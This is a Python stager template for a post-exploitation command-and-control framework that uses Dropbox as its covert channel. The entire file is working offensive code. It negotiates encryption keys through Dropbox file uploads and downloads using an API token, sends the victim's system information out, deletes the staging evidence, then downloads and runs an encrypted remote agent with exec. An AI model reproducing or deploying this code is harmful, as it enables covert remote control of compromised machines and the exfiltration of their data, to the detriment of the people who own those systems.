#!/usr/bin/env python

"""
This file is a Jinja2 template.
    Variables:
        staging_folder
        poll_interval
        staging_key
        profile
        api_token
"""

import random
import string
import time
import urllib.request

{% include 'common/rc4.py' %}
{% include 'common/aes.py' %}
{% include 'common/diffiehellman.py' %}
{% include 'common/get_sysinfo.py' %}
{% include 'dropbox/comms.py' %}

# server configuration information
stagingFolder = "{{ staging_folder }}"
stagingKey = "{{ staging_key }}"
profile = "{{ profile }}"
pollInterval = int("{{ poll_interval }}")
# note that this doesn't need the quotes (can just sub an int directly in) but
# having the quotes lets you run tools like pylint without syntax errors
t = "{{ api_token }}"

# generate a randomized sessionID
sessionID = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(8))

parts = profile.split('|')
taskURIs = parts[0].split(',')
userAgent = parts[1]
headersRaw = parts[2:]

# global header dictionary
#   sessionID is set by stager.py
# headers = {'User-Agent': userAgent, "Cookie": "SESSIONID=%s" % (sessionID)}
headers = {'User-Agent': userAgent}

# parse the headers into the global header dictionary
for headerRaw in headersRaw:
    try:
        headerKey = headerRaw.split(":")[0]
        headerValue = headerRaw.split(":")[1]
        if headerKey.lower() == "cookie":
            headers['Cookie'] = "%s;%s" % (headers['Cookie'], headerValue)
        else:
            headers[headerKey] = headerValue
    except Exception:
        pass

headers['Authorization'] = "Bearer %s" % (t)
headers['Content-Type'] = "application/octet-stream"
headers['Dropbox-API-Arg'] = "{\"path\":\"%s/%s_1.txt\"}" % (stagingFolder, sessionID)

# stage 3 of negotiation -> client generates DH key, and POSTs HMAC(AESn(PUBc)) back to server
clientPub = DiffieHellman()
hmacData = aes_encrypt_then_hmac(stagingKey, str(clientPub.publicKey))

# RC4 routing packet:
#   meta = STAGE1 (2)
routingPacket = build_routing_packet(stagingKey=stagingKey, sessionID=sessionID, meta=2, encData=hmacData)

try:
    # response = post_message(postURI, routingPacket+hmacData)
    response = post_message("https://content.dropboxapi.com/2/files/upload", routingPacket)
except Exception:
    exit()

#(urllib2.urlopen(urllib2.Request(uri, data, headers))).read()
time.sleep(pollInterval * 2)
try:
    del headers['Content-Type']
    headers['Dropbox-API-Arg'] = "{\"path\":\"%s/%s_2.txt\"}" % (stagingFolder, sessionID)
    raw = post_message("https://content.dropboxapi.com/2/files/download", data=None)
except Exception:
    exit()
# decrypt the server's public key and the server nonce
packet = aes_decrypt_and_verify(stagingKey, raw)
nonce = packet[0:16]
serverPub = int(packet[16:])

# calculate the shared secret
clientPub.genKey(serverPub)
key = clientPub.key

# step 5 -> client POSTs HMAC(AESs([nonce+1]|sysinfo)
hmacData = aes_encrypt_then_hmac(clientPub.key, get_sysinfo(nonce=str(int(nonce)+1)))

# RC4 routing packet:
#   sessionID = sessionID
#   language = PYTHON (2)
#   meta = STAGE2 (3)
#   extra = 0
#   length = len(length)
routingPacket = build_routing_packet(stagingKey=stagingKey, sessionID=sessionID, meta=3, encData=hmacData)
headers['Dropbox-API-Arg'] = "{\"path\":\"%s/%s_3.txt\"}" % (stagingFolder, sessionID)
headers['Content-Type'] = "application/octet-stream"
time.sleep(pollInterval * 2)
response = post_message("https://content.dropboxapi.com/2/files/upload", routingPacket)

time.sleep(pollInterval * 2)
headers['Dropbox-API-Arg'] = "{\"path\":\"%s/%s_4.txt\"}" % (stagingFolder, sessionID)
del headers['Content-Type']
raw = post_message("https://content.dropboxapi.com/2/files/download", data=None)

time.sleep(pollInterval)
del headers['Dropbox-API-Arg']
headers['Content-Type'] = "application/json"
datastring = "{\"path\":\"%s/%s_4.txt\"}" % (stagingFolder, sessionID)
response = post_message("https://api.dropboxapi.com/2/files/delete", data=datastring)

# step 6 -> server sends HMAC(AES)
agent = aes_decrypt_and_verify(key, raw)
exec(agent)
